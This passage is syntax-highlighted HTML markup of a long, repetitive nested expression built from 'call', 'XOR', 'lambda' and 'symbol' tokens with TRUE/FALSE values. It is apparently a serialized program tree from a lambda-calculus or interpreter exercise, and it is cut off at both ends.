class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span 